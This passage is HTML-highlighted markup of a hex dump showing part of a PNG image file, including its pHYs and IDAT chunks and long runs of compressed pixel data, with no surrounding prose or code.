</span><span class="number">0000 </span><span class="string">0ec3</span> <span class="number">0000 </span><span class="string">0ec3</span> <span class="string">01c7</span>  <span class="string">..pHYs..........</span></span><br><span class="line"><span class="attr">00000050:</span> <span class="string">6fa8</span> <span class="number">6400 </span><span class="number">0007 </span><span class="string">de49</span> <span class="number">4441 </span><span class="number">5478 </span><span class="string">5eed</span> <span class="string">dbf7</span>  <span class="string">o.d....IDATx^...</span></span><br><span class="line"><span class="attr">00000060:</span> <span class="number">9314 </span><span class="number">4518 </span><span class="string">c671</span> <span class="string">ffff</span> <span class="string">1f2d</span> <span class="string">ab2c</span> <span class="string">73c0</span> <span class="string">9cb0</span>  <span class="string">..E..q...-.,s...</span></span><br><span class="line"><span class="attr">00000070:</span> <span class="string">0c08</span> <span class="number">7292 </span><span class="number">0491 </span><span class="number">2092 </span><span class="number">8380 </span><span class="number">08e2</span> <span class="string">09ca</span> <span class="string">c1a1</span>  <span class="string">..r...</span> <span class="string">.........</span></span><br><span class="line"><span class="attr">00000080:</span> <span class="number">2248 </span><span class="string">7aed</span> <span class="string">c799</span> <span class="string">2ea7</span> <span class="string">a67a</span> <span class="string">6f7b</span> <span class="string">c3ed</span> <span class="string">edf2</span>  <span class="string">&quot;Hz......zo&#123;....</span></span><br><span class="line"><span class="string">00000090: 7c3f 5553 1c7d bdd3 d361 9f09 bbf7 5400  |?US.&#125;...a....T.</span></span><br><span class="line"><span class="string">000000a0: 8021 c20f 8025 c20f 8025 c20f 8025 c20f  .!...%...%...%..</span></span><br><span class="line"><span class="string">000000b0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">000000c0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">000000d0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">000000e0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">000000f0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000100: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000110: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000120: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000130: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000140: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000150: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000160: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000170: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000180: 8025 c20f 8025 c20f 80a5 c50c bf07 0f23  .%...%.........#</span></span><br><span class="line"><span class="string">00000190: eede 8fb8 d76e fa59 654f 82dc b7bf ff69  .....n.YeO.....i</span></span><br><span class="line"><span class="string">000001a0: 0b30 538f 1fa7 f14f 63af 4d3f 976c d41c  .0S....Oc.M?.l..</span></span><br><span class="line"><span class="string">000001b0: cda2 5da3 f5b7 98e1 77e4 c788 67b7 45bc  ..].....w...g.E.</span></span><br><span class="line"><span class="string">000001c0: f855 c49b 5f47 bcba 33e2 f8e5 f697 0b4e  .U.._G..3......N</span></span><br><span class="line"><span class="string">000001d0: fd50 7f5e 586a 0b30 5337 ff8a 7869 47b3  .P.^Xj.0S7..xiG.</span></span><br><span class="line"><span class="string">000001e0: e9e7 928d 9aa3 59b4 6bb4 fe16 ffb6 f78d  ......Y.k.......</span></span><br><span class="line"><span class="string">000001f0: 3d11 efec 8b38 73b5 2d58 703f 2c47 bcbd  =....8s.-Xp?,G..</span></span><br><span class="line"><span class="string">00000200: 37bd f952 b063 f6ee dc8b 782b 9d50 b5e9  7..R.c....x+.P..</span></span><br><span class="line"><span class="string">00000210: e712 ad35 adb9 4d69 edcd d22c dad5 fadb  ...5..Mi...,....</span></span><br><span class="line"><span class="string">00000220: 88be 6d80 c50f 3f4d d25a e1a7 4bf8 5da7  ..m...?M.Z..K.].</span></span><br><span class="line"><span class="string">00000230: 2276 9ffe 7f3b d6bb 4abc f27b c49e 54be  &quot;</span><span class="string">v...;..J..&#123;..T.</span></span><br><span class="line"><span class="attr">00000240:</span> <span class="string">e364</span> <span class="string">5b90</span> <span class="string">94ca</span> <span class="string">64dc</span> <span class="string">fd5d</span> <span class="string">5d29</span> <span class="string">efaf</span> <span class="string">4b67</span>  <span class="string">.d[...d..]])..Kg</span></span><br><span class="line"><span class="attr">00000250:</span> <span class="string">dd2d</span> <span class="number">4722 </span><span class="string">bef8</span> <span class="string">3ee2</span> <span class="string">da6a</span> <span class="string">5b98</span> <span class="string">cce2</span> <span class="string">f826</span>  <span class="string">.-G&quot;..&gt;..j[....&amp;</span></span><br><span class="line"><span class="attr">00000260:</span> <span class="string">d99f</span> <span class="string">fc79</span> <span class="number">3762 </span><span class="string">e9f8</span> <span class="string">daf5</span> <span class="string">721b</span> <span class="string">fbce</span> <span class="string">ae5d</span>  <span class="string">...y7b....r....]</span></span><br><span class="line"><span class="attr">00000270:</span> <span class="string">4f4a</span> <span class="string">ed6a</span> <span class="string">fbf2</span> <span class="string">585b</span> <span class="string">a155</span> <span class="string">7b7c</span> <span class="string">35f5</span> <span class="string">2ea7</span>  <span class="string">OJ.j..X[.U&#123;|5...</span></span><br><span class="line"><span class="attr">00000280:</span> <span class="string">e3d3</span> <span class="string">fedf</span> <span class="string">dfdf</span> <span class="string">6c1a</span> <span class="string">0b1d</span> <span class="string">afea</span> <span class="string">76db</span> <span class="string">cd21</span>  <span class="string">......l.....v..!</span></span><br><span class="line"><span class="attr">00000290:</span> <span class="string">f4de</span> <span class="number">3711 </span><span class="string">7b3b</span> <span class="string">7d19</span> <span class="string">b75d</span> <span class="string">a9e9</span> <span class="string">ef28</span> <span class="string">edd6</span>  <span class="string">..7.&#123;;&#125;..]...(..</span></span><br><span class="line"><span class="attr">000002a0:</span> <span class="string">cc87</span> <span class="string">74db</span> <span class="string">fdfa</span> <span class="string">4cb3</span> <span class="string">f63e</span> <span class="string">487d</span> <span class="string">ef87</span> <span class="string">5f4d</span>  <span class="string">..t...L..&gt;H&#125;.._M</span></span><br><span class="line"><span class="attr">000002b0:</span> <span class="string">3f06</span> <span class="string">ada1</span> <span class="string">bfd2</span> <span class="number">4944 </span><span class="string">afd5</span> <span class="string">a69f</span> <span class="string">e7c4</span> <span class="string">931d</span>  <span class="string">?.....ID........</span></span><br><span class="line"><span class="attr">000002c0:</span> <span class="string">7eab</span> <span class="string">779a</span> <span class="number">4079 </span><span class="string">6d57</span> <span class="string">73ab</span> <span class="string">7cf8</span> <span class="string">62c4</span> <span class="string">b6a3</span>  <span class="string">~.w.@ymWs.|.b...</span></span><br><span class="line"><span class="attr">000002d0:</span> <span class="string">119f</span> <span class="string">1c8e</span> <span class="string">b874</span> <span class="string">bdad</span> <span class="string">949c</span> <span class="string">baf2</span> <span class="string">ffed</span> <span class="number">7356</span>  <span class="string">.....t........sV</span></span><br><span class="line"><span class="attr">000002e0:</span> <span class="string">2a1b</span> <span class="string">777f</span> <span class="string">cbb7</span> <span class="string">9a45</span> <span class="string">a1b2</span> <span class="string">97d3</span> <span class="string">edd4</span> <span class="string">205f</span>  <span class="string">*.w....E......</span> <span class="string">_</span></span><br><span class="line"><span class="attr">000002f0:</span> <span class="string">a6c5</span> <span class="string">aa2b</span> <span class="string">8ea5</span> <span class="string">136d</span> <span class="string">416b</span> <span class="string">bd8f</span> <span class="string">4f6a</span> <span class="string">f7b7</span>  <span class="string">...+...mAk..Oj..</span></span><br><span class="line"><span class="attr">00000300:</span> <span class="string">35bd</span> <span class="string">393e</span> <span class="number">3e14</span> <span class="string">71f1</span> <span class="string">5a5b</span> <span class="string">a9a5</span> <span class="string">aba4</span> <span class="string">6fce</span>  <span class="number">5.9</span><span class="string">&gt;&gt;.q.Z[....o.</span></span><br><span class="line"><span class="attr">00000310:</span> <span class="string">451c</span> <span class="string">bc30</span> <span class="string">bc5d</span> <span class="string">f571</span> <span class="string">ade3</span> <span class="string">ebb7</span> <span class="string">ab7d</span> <span class="string">e64d</span>  <span class="string">E..0.].q.....&#125;.M</span></span><br><span class="line"><span class="attr">00000320:</span> <span class="string">6ffa</span> <span class="string">acb6</span> <span class="string">bfb5</span> <span class="string">f596</span> <span class="string">6f36</span> <span class="string">f3a4</span> <span class="string">70d1</span> <span class="string">a690</span>  <span class="string">o.......o6..p...</span></span><br><span class="line"><span class="attr">00000330:</span> <span class="number">3e54</span> <span class="number">6837 </span><span class="string">87d0</span> <span class="string">bba9</span> <span class="string">ce34</span> <span class="string">daad</span> <span class="string">ed6f</span> <span class="string">6dbb</span>  <span class="string">&gt;Th7.....4...om.</span></span><br><span class="line"><span class="attr">00000340:</span> <span class="number">5233 </span><span class="string">1fa5</span> <span class="string">e353</span> <span class="string">602a</span> <span class="string">f8bb</span> <span class="string">e157</span> <span class="string">db8f</span> <span class="string">fe1a</span>  <span class="string">R3...S`*...W....</span></span><br><span class="line"><span class="attr">00000350:</span> <span class="string">ba72</span> <span class="string">a379</span> <span class="string">eded</span> <span class="string">bf23</span> <span class="string">5edf</span> <span class="string">dd6c</span> <span class="string">b706</span> <span class="string">3c4a</span>  <span class="string">.r.y...#^..l..&lt;J</span></span><br><span class="line"><span class="attr">00000360:</span> <span class="string">d800</span> <span class="string">4f76</span> <span class="string">f89d</span> <span class="string">4c93</span> <span class="string">a1db</span> <span class="string">e2ee</span> <span class="string">44fe</span> <span class="string">f04b</span>  <span class="string">..Ov..L.....D..K</span></span><br><span class="line"><span class="attr">00000370:</span> <span class="string">7b5b</span> <span class="string">d909</span> <span class="string">a1bc</span> <span class="string">a8ba</span> <span class="string">f54a</span> <span class="string">65a3</span> <span class="string">ee4f</span> <span class="string">0b41</span>  &#123;[<span class="string">.......Je..O.A</span></span><br><span class="line"><span class="attr">00000380:</span> <span class="string">be4a</span> <span class="string">67c2</span> <span class="string">8f0f</span> <span class="string">467c</span> <span class="string">f65d</span> <span class="number">7356 </span><span class="string">2d79</span> <span class="string">f828</span>  <span class="string">.Jg...F|.</span>]<span class="string">sV-y.(</span></span><br><span class="line"><span class="attr">00000390:</span> <span class="string">627b</span> <span class="string">5a78</span> <span class="string">1f7e</span> <span class="string">9bce</span> <span class="string">c09d</span> <span class="string">052f</span> <span class="string">eb75</span> <span class="string">7ce3</span>  <span class="string">b</span>&#123;<span class="string">Zx.~...../.u|.</span></span><br><span class="line"><span class="attr">000003a0:</span> <span class="string">ec4f</span> <span class="string">a1b7</span> <span class="string">f940</span> <span class="number">1360 </span><span class="string">6ba9</span> <span class="string">6db7</span> <span class="string">54af</span> <span class="string">d46e</span>  <span class="string">.O...@.`k.m.T..n</span></span><br><span class="line"><span class="attr">000003b0:</span> <span class="string">496d</span> <span class="string">7f6b</span> <span class="string">eb89</span> <span class="string">ae4c</span> <span class="string">f26d</span> <span class="string">efa0</span> <span class="string">ab94</span> <span class="string">49fa</span>  <span class="string">Im.k...L.m....I.</span></span><br><span class="line"><span class="attr">000003c0:</span> <span class="number">3149 </span><span class="string">7f6b</span> <span class="string">db2d</span> <span class="number">19e5</span> <span class="string">f86a</span> <span class="string">d641</span> <span class="string">697f</span> <span class="string">fde3</span>  <span class="string">1I.k.-...j.Ai...</span></span><br><span class="line"><span class="attr">000003d0:</span> <span class="string">fb34</span> <span class="string">adf7</span> <span class="number">9329 </span><span class="string">34bb</span> <span class="string">8f12</span> <span class="number">1486 </span><span class="number">73e2</span> <span class="string">c90e</span>  <span class="number">.4</span><span class="string">...)4.....s...</span></span><br><span class="line"><span class="attr">000003e0:</span> <span class="string">bfd2</span> <span class="number">6299 </span><span class="string">76d9</span> <span class="string">f95f</span> <span class="string">07d7</span> <span class="string">fbe8</span> <span class="string">40c4</span> <span class="string">335b</span>  <span class="string">..b.v.._....@.3</span>[</span><br><span class="line"><span class="attr">000003f0:</span> <span class="string">23fe</span> <span class="number">4867 </span><span class="string">be61</span> <span class="string">f480</span> <span class="string">f9ad</span> <span class="string">b498</span> <span class="string">ce2f</span> <span class="string">b705</span>  <span class="comment">#.Hg.a......./..</span></span><br><span class="line"><span class="attr">00000400:</span> <span class="string">1dd3</span> <span class="string">3ee6</span> <span class="string">49ca</span> <span class="string">6aad</span> <span class="string">352e</span> <span class="string">c3ca</span> <span class="string">8eff</span> <span class="string">d45c</span>  <span class="string">..&gt;.I.j.5......\</span></span><br><span class="line"><span class="attr">00000410:</span> <span class="string">650c</span> <span class="string">6bb7</span> <span class="string">f4da</span> <span class="string">da76</span> <span class="string">4bf5</span> <span class="string">446f</span> <span class="string">ce61</span> <span class="string">6fd4</span>  <span class="string">e.k....vK.Do.ao.</span></span><br><span class="line"><span class="attr">00000420:</span> <span class="string">da7e</span> <span class="string">d4b6</span> <span class="string">3b49</span> <span class="string">7f4b</span> <span class="number">6525 </span><span class="string">93cc</span> <span class="string">c7b8</span> <span class="string">655f</span>  <span class="string">.~..;I.Ke%....e_</span></span><br><span class="line"><span class="attr">00000430:</span> <span class="string">a4ab</span> <span class="string">c333</span> <span class="string">3f13</span> <span class="string">7eeb</span> <span class="number">4603 </span><span class="string">ad01</span> <span class="string">d7c0</span> <span class="string">f74d</span>  <span class="string">...3?.~.F......M</span></span><br><span class="line"><span class="attr">00000440:</span> <span class="number">7322 </span><span class="number">2597 </span><span class="string">e9ea</span> <span class="string">4c13</span> <span class="string">996f</span> <span class="string">e114</span> <span class="string">5add</span> <span class="string">0f28</span>  <span class="string">s&quot;%...L..o..Z..(</span></span><br><span class="line"><span class="attr">00000450:</span> <span class="string">723d</span> <span class="string">9d2d</span> <span class="string">6ba9</span> <span class="string">1d6d</span> <span class="string">27d2</span> <span class="string">99b2</span> <span class="string">6f1a</span> <span class="string">c73c</span>  <span class="string">r=.-k..m&#x27;...o..&lt;</span></span><br><span class="line"><span class="attr">00000460:</span> <span class="string">adb2</span> <span class="number">4174 </span><span class="string">95a4</span> <span class="string">f1c8</span> <span class="string">9b6e</span> <span class="string">cd34</span> <span class="string">4ee3</span> <span class="string">b6a1</span>  <span class="string">..At.....n.4N...</span></span><br><span class="line"><span class="attr">00000470:</span> <span class="string">4f5a</span> <span class="string">5f49</span> <span class="string">b74f</span> <span class="string">dd71</span> <span class="string">d615</span> <span class="number">7457 </span><span class="string">7e6d</span> <span class="string">ed7c</span>  <span class="string">OZ_I.O.q..tW~m.|</span></span><br><span class="line"><span class="attr">00000480:</span> <span class="string">0cab</span> <span class="string">27eb</span> <span class="string">117e</span> <span class="string">35ed</span> <span class="string">8ed2</span> <span class="string">df9a</span> <span class="string">f19b</span> <span class="string">e67c</span>  <span class="string">..&#x27;..~5........|</span></span><br><span class="line"><span class="attr">00000490:</span> <span class="string">8c5b</span> <span class="string">46f8</span> <span class="string">ad33</span> <span class="string">0db4</span> <span class="string">065c</span> <span class="string">03df</span> <span class="string">573b</span> <span class="string">69f9</span>  <span class="string">.</span>[<span class="string">F..3...\..W;i.</span></span><br><span class="line"><span class="attr">000004a0:</span> <span class="number">5945 </span><span class="string">b7ec</span> <span class="string">5c7b</span> <span class="string">59af</span> <span class="number">0599 </span><span class="string">e5d7</span> <span class="string">aa7c</span> <span class="string">e5cf</span>  <span class="string">YE..\</span>&#123;<span class="string">Y......|..</span></span><br><span class="line"><span class="attr">000004b0:</span> <span class="string">e619</span> <span class="string">d1af</span> <span class="string">b79a</span> <span class="string">edea</span> <span class="string">4a5b</span> <span class="number">2929 </span><span class="string">b531</span> <span class="number">8816</span>  <span class="string">........J</span>[<span class="string">)).1..</span></span><br><span class="line"><span class="attr">000004c0:</span> <span class="string">a91e</span> <span class="string">34ab</span> <span class="string">7d9d</span> <span class="string">9db5</span> <span class="string">50fa</span> <span class="string">6afb</span> <span class="string">318b</span> <span class="string">b292</span>  <span class="string">..4.</span>&#125;<span class="string">...P.j.1...</span></span><br><span class="line"><span class="attr">000004d0:</span> <span class="string">9f6f</span> <span class="string">a437</span> <span class="string">ea89</span> <span class="string">a69e</span> <span class="string">c6e5</span> <span class="string">b7db</span> <span class="number">1107 </span><span class="string">cf37</span>  <span class="string">.o.7...........7</span></span><br><span class="line"><span class="attr">000004e0:</span> <span class="string">cfcd</span> <span class="string">c66d</span> <span class="string">43df</span> <span class="string">37d3</span> <span class="string">986a</span> <span class="string">8cb5</span> <span class="string">bf03</span> <span class="string">697f</span>  <span class="string">...mC.7..j....i.</span></span><br><span class="line"><span class="attr">000004f0:</span> <span class="string">ba92</span> <span class="string">de7d</span> <span class="string">aaad</span> <span class="number">90e4</span> <span class="string">d7d6</span> <span class="string">cec7</span> <span class="string">b07a</span> <span class="string">b21e</span>  <span class="string">...</span>&#125;<span class="string">.........z..</span></span><br><span class="line"><span class="attr">00000500:</span> <span class="string">e157</span> <span class="string">d3ee</span> <span class="string">28fd</span> <span class="string">1dd6</span> <span class="string">eeb4</span> <span class="string">e7a3</span> <span class="string">b6ac</span> <span class="string">ff3e</span>  <span class="string">.W..(..........&gt;</span></span><br><span class="line"><span class="attr">00000510:</span> <span class="string">fafc</span> <span class="string">48aa</span> <span class="string">97c2</span> <span class="string">efde</span> <span class="number">8366 </span><span class="string">3c79</span> <span class="string">e637</span> <span class="string">651a</span>  <span class="string">..H......f&lt;y.7e.</span></span><br><span class="line"><span class="attr">00000520:</span> <span class="string">684d</span> <span class="number">8226 </span><span class="string">a3ef</span> <span class="string">741a</span> <span class="string">782d</span> <span class="string">bcd2</span> <span class="string">a469</span> <span class="string">22b2</span>  <span class="string">hM.&amp;..t.x-...i&quot;.</span></span><br><span class="line"><span class="attr">00000530:</span> <span class="string">6b69</span> <span class="string">31ea</span> <span class="string">e1f6</span> <span class="string">a654</span> <span class="string">a605</span> <span class="string">a84f</span> <span class="string">fdf6</span> <span class="string">a640</span>  <span class="string">ki1....T...O...@</span></span><br><span class="line"><span class="attr">00000540:</span> <span class="string">da7c</span> <span class="string">b079</span> <span class="string">e09d</span> <span class="string">95f6</span> <span class="number">5752 </span><span class="string">5a18</span> <span class="number">83e8</span> <span class="string">0da6</span>  <span class="string">.|.y....WRZ.....</span></span><br><span class="line"><span class="attr">00000550:</span> <span class="number">7675 </span><span class="number">9538 </span><span class="string">e8f6</span> <span class="string">b8b6</span> <span class="string">1fd3</span> <span class="string">a8d7</span> <span class="string">2d2b</span> <span class="string">d5d3</span>  <span class="string">vu.8........-+..</span></span><br><span class="line"><span class="attr">00000560:</span> <span class="string">e2bd</span> <span class="number">9042 </span><span class="string">fa6c</span> <span class="string">3a39</span> <span class="string">647a</span> <span class="number">2654 </span><span class="string">3a79</span> <span class="string">f4f7</span>  <span class="string">...B.l:9dz&amp;T:y..</span></span><br><span class="line"><span class="attr">00000570:</span> <span class="string">576a</span> <span class="string">a376</span> <span class="string">acf2</span> <span class="string">c9a8</span> <span class="string">fb81</span> <span class="string">51ed</span> <span class="string">7cd4</span> <span class="string">d693</span>  <span class="string">Wj.v......Q.|...</span></span><br><span class="line"><span class="attr">00000580:</span> <span class="string">5b69</span> <span class="number">3e34</span> <span class="string">177a</span> <span class="string">b3ea</span> <span class="string">417d</span> <span class="string">496d</span> <span class="string">3f46</span> <span class="string">69b7</span>  [<span class="string">i&gt;4.z..A</span>&#125;<span class="string">Im?Fi.</span></span><br><span class="line"><span class="attr">00000590:</span> <span class="string">afd4</span> <span class="string">dfda</span> <span class="string">766b</span> <span class="string">e763</span> <span class="number">9275 </span><span class="string">90eb</span> <span class="string">95de</span> <span class="string">471a</span>  <span class="string">....vk.c.u....G.</span></span><br><span class="line"><span class="attr">000005a0:</span> <span class="string">bf5f</span> <span class="number">5288 </span><span class="string">1f4d</span> <span class="string">b7f3</span> <span class="number">6753 </span><span class="string">bdd3</span> <span class="string">69d3</span> <span class="string">f1e8</span>  <span class="string">._R..M..gS..i...</span></span><br><span class="line"><span class="attr">000005b0:</span> <span class="string">c392</span> <span class="string">3bf3</span> <span class="string">f3e5</span> <span class="string">e9c5</span> <span class="string">0cbf</span> <span class="string">ffbe</span> <span class="string">85de</span> <span class="string">0ea2</span>  <span class="string">..;.............</span></span><br><span class="line"><span class="attr">000005c0:</span> <span class="number">0655 </span><span class="string">97f4</span> <span class="string">ba5d</span> <span class="string">d487</span> <span class="string">06dd</span> <span class="string">6fa6</span> <span class="string">eb3b</span> <span class="string">4b0a</span>  <span class="string">.U...</span>]<span class="string">....o..;K.</span></span><br><span class="line"><span class="attr">000005d0:</span> <span class="string">b07c</span> <span class="string">fba9</span> <span class="string">dfab</span> <span class="string">9ece</span> <span class="string">80ba</span> <span class="number">05e8</span> <span class="string">d2a4</span> <span class="string">e843</span>  <span class="string">.|.............C</span></span><br><span class="line"><span class="attr">000005e0:</span> <span class="string">092d</span> <span class="string">7a4d</span> <span class="string">b43e</span> <span class="string">98d8</span> <span class="string">77ae</span> <span class="string">fd65</span> <span class="string">abbf</span> <span class="string">bffc</span>  <span class="string">.-zM.&gt;..w..e....</span></span><br><span class="line"><span class="attr">000005f0:</span> <span class="string">d725</span> <span class="string">fab7</span> <span class="string">abb4</span> <span class="string">804a</span> <span class="string">1e3d</span> <span class="string">8eb8</span> <span class="string">beda</span> <span class="string">f441</span>  <span class="string">.%.....J.=.....A</span></span><br><span class="line"><span class="attr">00000600:</span> <span class="string">6daf</span> <span class="number">0e78</span> <span class="string">b3d5</span> <span class="string">f663</span> <span class="string">d27a</span> <span class="string">1ac7</span> <span class="string">ee31</span> <span class="string">97ea</span>  <span class="string">m..x...c.z...1..</span></span><br><span class="line"><span class="attr">00000610:</span> <span class="string">1dbd</span> <span class="string">d4fc</span> <span class="string">5f63</span> <span class="string">94d5</span> <span class="string">eeaf</span> <span class="string">f6cd</span> <span class="string">9be7</span> <span class="string">37ff</span>  <span class="string">...._c........7.</span></span><br><span class="line"><span class="attr">00000620:</span> <span class="string">054f</span> <span class="string">6d3f</span> <span class="string">06cd</span> <span class="string">476d</span> <span class="string">3dd1</span> <span class="string">1c68</span> <span class="number">2e34</span> <span class="string">27d7</span>  <span class="string">.Om?..Gm=..h.4&#x27;.</span></span><br><span class="line"><span class="attr">00000630:</span> <span class="string">d315</span> <span class="string">d3fd</span> <span class="string">74d5</span> <span class="string">a27a</span> <span class="string">dd75</span> <span class="string">55db</span> <span class="string">8fda</span> <span class="string">766b</span>  <span class="string">....t..z.uU...vk</span></span><br><span class="line"><span class="attr">00000640:</span> <span class="string">fb3b</span> <span class="string">6ebb</span> <span class="string">a3cc</span> <span class="string">ef28</span> <span class="string">f54a</span> <span class="string">efa3</span> <span class="string">fc81</span> <span class="string">913e</span>  <span class="string">.;n....(.J.....&gt;</span></span><br><span class="line"><span class="attr">00000650:</span> <span class="string">f155</span> <span class="string">5f14</span> <span class="string">ba7a</span> <span class="string">5d77</span> <span class="string">7f73</span> <span class="number">6231 </span><span class="string">c34f</span> <span class="number">6790</span>  <span class="string">.U_..z</span>]<span class="string">w.sb1.Og.</span></span><br><span class="line"><span class="attr">00000660:</span> <span class="string">fc17</span> <span class="string">1e1a</span> <span class="string">586d</span> <span class="string">1a6c</span> <span class="string">fdff</span> <span class="string">e92d</span> <span class="string">6da5</span> <span class="number">9626</span>  <span class="string">....Xm.l...-m..&amp;</span></span><br><span class="line"><span class="attr">00000670:</span> <span class="string">43cf</span> <span class="string">57f4</span> <span class="string">3b6d</span> <span class="string">fa74</span> <span class="string">4acf</span> <span class="number">2206 </span><span class="string">797e</span> <span class="string">a9b9</span>  <span class="string">C.W.;m.tJ.&quot;.y~..</span></span><br><span class="line"><span class="attr">00000680:</span> <span class="string">d5d5</span> <span class="string">d9ae</span> <span class="string">a4bf</span> <span class="string">bfe7</span> <span class="string">b637</span> <span class="string">0ba3</span> <span class="string">4b0f</span> <span class="string">b0b5</span>  <span class="string">.........7..K...</span></span><br><span class="line"><span class="attr">00000690:</span> <span class="string">0fed</span> <span class="string">6b2d</span> <span class="string">fafa</span> <span class="string">80ce</span> <span class="string">9c35</span> <span class="string">0ba3</span> <span class="string">dbae</span> <span class="string">ae14</span>  <span class="string">..k-.....5......</span></span><br><span class="line"><span class="attr">000006a0:</span> <span class="string">153e</span> <span class="string">3b3a</span> <span class="string">b744</span> <span class="string">596d</span> <span class="string">7ffb</span> <span class="string">f534</span> <span class="string">7e1a</span> <span class="string">c7fe</span>  <span class="string">.&gt;;:.DYm...4~...</span></span><br><span class="line"><span class="attr">000006b0:</span> <span class="string">314f</span> <span class="string">737f</span> <span class="string">a571</span> <span class="number">2995 </span><span class="number">75e7</span> <span class="string">77d4</span> <span class="string">764b</span> <span class="string">f321</span>  <span class="string">1Os..q).u.w.vK.!</span></span><br><span class="line"><span class="attr">000006c0:</span> <span class="string">b5f5</span> <span class="string">321d</span> <span class="string">8fae</span> <span class="string">ba72</span> <span class="string">fdee</span> <span class="string">baaa</span> <span class="string">ed87</span> <span class="string">d4b4</span>  <span class="string">..2....r........</span></span><br><span class="line"><span class="attr">000006d0:</span> <span class="string">5bdb</span> <span class="string">df49</span> <span class="string">daad</span> <span class="string">9ddf</span> <span class="string">49d7</span> <span class="string">c14a</span> <span class="string">ba33</span> <span class="string">503d</span>  [<span class="string">..I....I..J.3P=</span></span><br><span class="line"><span class="attr">000006e0:</span> <span class="string">6d7f</span> <span class="string">dc6d</span> <span class="number">6e85</span> <span class="string">4bc7</span> <span class="number">3707 </span><span class="string">16ff</span> <span class="string">b677</span> <span class="number">91e9</span>  <span class="string">m..mn.K.7....w..</span></span><br><span class="line"><span class="attr">000006f0:</span> <span class="string">eca9</span> <span class="string">f0d3</span> <span class="number">4219 </span><span class="string">c5ce</span> <span class="string">147a</span> <span class="string">ba32</span> <span class="string">292d</span> <span class="number">3e00</span>  <span class="string">....B....z.2)-&gt;.</span></span><br><span class="line"><span class="attr">00000700:</span> <span class="number">5508 </span><span class="string">bf8d</span> <span class="string">a46f</span> <span class="string">e1eb</span> <span class="string">01b7</span> <span class="number">9e33</span> <span class="string">d6d2</span> <span class="string">37eb</span>  <span class="string">U....o.....3..7.</span></span><br><span class="line"><span class="attr">00000710:</span> <span class="string">f525</span> <span class="string">d4fd</span> <span class="string">e996</span> <span class="string">7c8e</span> <span class="string">1e1e</span> <span class="string">038b</span> <span class="string">86f0</span> <span class="string">9b77</span>  <span class="string">.%....|........w</span></span><br><span class="line"><span class="attr">00000720:</span> <span class="string">fae4</span> <span class="string">4e9f</span> <span class="string">025f</span> <span class="string">b8d6</span> <span class="string">7c63</span> <span class="string">5eb7</span> <span class="string">10fa</span> <span class="string">d6bf</span>  <span class="string">..N.._..|c^.....</span></span><br><span class="line"><span class="attr">00000730:</span> <span class="number">9e15</span> <span class="number">0218 </span><span class="string">1be1</span> <span class="string">37ef</span> <span class="string">f477</span> <span class="string">927a</span> <span class="string">a8ac</span> <span class="string">bfaa</span>  <span class="string">......7..w.z....</span></span><br><span class="line"><span class="attr">00000740:</span> <span class="string">d0a6</span> <span class="string">af3f</span> <span class="string">ccd1</span> <span class="number">2766 </span><span class="string">c0a2</span> <span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">...?..&#x27;f..&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000750:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000760:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000770:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000780:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000790:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007a0:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007b0:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007c0:</span> <span class="number">0058 